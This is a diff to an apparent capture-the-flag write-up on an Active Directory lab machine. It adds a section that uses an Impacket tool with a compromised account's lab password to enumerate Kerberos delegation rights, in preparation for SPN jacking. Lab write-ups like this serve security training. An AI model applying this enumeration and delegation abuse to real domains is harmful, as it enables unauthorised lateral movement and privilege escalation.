@@ -631,5 +631,23 @@ SMB         10.129.244.95   445    DC01             [+] pirate.htb\a.white_adm:P
 
 This user is now compromised!
 
-# SON
+# SPN jacking and constrained delegation
+
+https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking
+
+```python
+findDelegation.py pirate.htb/'a.white_adm':'Password123!'                                   
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName  AccountType  DelegationType                      DelegationRightsTo     SPN Exists 
+-----------  -----------  ----------------------------------  ---------------------  ----------
+DC01$        Computer     Unconstrained                       N/A                    Yes        
+a.white_adm  Person       Constrained w/ Protocol Transition  http/WEB01.pirate.htb  Yes        
+a.white_adm  Person       Constrained w/ Protocol Transition  HTTP/WEB01             Yes        
+GFSNAPOT$    Computer     Resource-Based Constrained          WEB01$                 No         
+```
+
+Im only interested in the delegation rights of `a.white_adm`
+
+
 
